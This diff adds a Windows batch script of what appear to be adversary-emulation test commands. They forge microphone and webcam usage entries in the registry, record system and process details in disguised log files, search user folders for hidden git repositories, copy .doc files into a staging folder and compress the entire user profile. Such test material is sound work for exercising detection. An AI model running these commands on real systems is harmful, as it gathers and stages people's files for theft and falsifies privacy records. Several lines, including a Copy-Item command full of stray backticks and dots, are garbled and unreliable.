@@ -1,0 +1,10 @@
+@echo Off
+C reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f && reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f
+powershell.exe -ExecutionPolicy Bypass -C "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object"
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c "Get-WmiObject -class win32_operatingsystem | select -property * | export-csv msdebug.log"
+powershell.exe -ExecutionPolicy Bypass -C "Get-ChildItem C:\Users -Attributes Directory+Hidden -ErrorAction SilentlyContinue -Filter \".git\" -Recurse | foreach {$_.parent.FullName} | Select-Object; exit 0;"
+powershell.exe -ExecutionPolicy Bypass -C "wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\vmtools.log;cat $env:APPDATA\vmtools.log"
+powershell.exe -ExecutionPolicy Bypass -C "Copy-Item C:\Program````````````````````````.........::S:Stri::String C:\Users\Administrator\staged"
+cmd.exe /C reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f && reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f
+powershell.exe -ExecutionPolicy Bypass -C "New-Item -Path $env:TEMP\T1119_powershell_collection -ItemType Directory -Force | Out-Null; Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP\T1119_powershell_collection}"
+powershell.exe -ExecutionPolicy Bypass -C "dir $env:USERPROFILE -Recurse | Compress-Archive -DestinationPath $env:USERPROFILE\T1560-data-ps.zip"
